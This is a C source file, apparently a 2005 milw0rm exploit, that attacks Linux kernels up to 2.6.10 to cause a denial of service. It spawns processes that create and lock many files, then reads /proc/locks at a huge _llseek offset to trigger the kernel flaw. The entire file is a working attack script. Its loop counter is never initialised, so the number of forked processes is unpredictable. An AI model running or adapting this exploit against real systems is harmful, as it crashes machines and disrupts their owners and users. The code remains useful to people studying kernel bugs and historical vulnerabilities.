/* Removed ='s at the bottom /str0ke */

/*
 * linux kernel <=2.6.10(2.6.x) DOS exploit
 * writen by ChoiX
 * (c) uKt Research
 * [www.unl0ck.org][info@unl0ck.org]
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <syscall.h>
#include <errno.h>

#define SIZE 0x80004242

_syscall5(int, _llseek, uint, fd, ulong, hi, ulong, lo, loff_t *, res, uint, wh);

void createfile(){
int nm1, filev;
char vname[424];

for(nm1=0;nm1<920;nm1++){
	snprintf(vname, sizeof(vname), "UNLOCKRESEARCHTEAM%d.%d", getpid(), nm1);
	filev = open(vname, O_CREAT|O_RDWR, S_IRWXU);
	if(filev < 0){
		printf("ERROR\n");
		perror("open()");
	}
	if(flock(filev,LOCK_EX) == -1){
		printf("ERROR\n");
		perror("flock()");
	}
}
while(42);
}

int main(int argc, char *argv[]){
int count, fd, i, fv;
void *mv;
char *buf1, *buf2;
loff_t lr;
int nm1;

printf("\t\tkernel-2.6.10 DoS by ChoiX [Unl0ck Team]\n");
printf("[--]create files(it can take a few minutes)...");
nm1 = 5;
while(count--){
	if(!fork()){
		createfile();
	}
}
sleep(100);

printf("OK\n");

printf("[--]start exploiting...");

system("sync");
fd=open("/proc/locks", O_RDONLY);
if(fd < 0){
	printf("ERROR\n");
	perror("open()");
}
buf1 = malloc(1024*1024*8);
buf2 = malloc(1024*1024*8);

if(_llseek(fd,42,SIZE,&lr,SEEK_SET) == -1){
	printf("ERROR\n");
	printf("llseek()");
}
i=read(fd,buf2, SIZE);
perror("read");
printf("read=%d mv=%x fv=%x\n %.300s",i,(int)mv,fv,buf2);
while(42);
return 42;
}

// milw0rm.com [2005-03-29]
